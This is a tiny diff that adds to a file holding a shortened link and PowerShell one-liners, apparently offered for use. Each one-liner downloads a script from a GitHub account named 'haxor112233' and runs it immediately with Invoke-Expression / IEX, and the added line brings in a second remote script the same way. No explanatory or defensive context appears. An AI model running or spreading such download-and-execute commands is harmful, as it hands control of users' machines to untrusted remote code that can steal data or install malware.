@@ -1,3 +1,6 @@
 https://shorturl.at/Nb9ME
 
 Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/script.ps1").Content
+
+
+IRM "https://github.com/haxor112233/file/blob/main/extension.ps1" | IEX
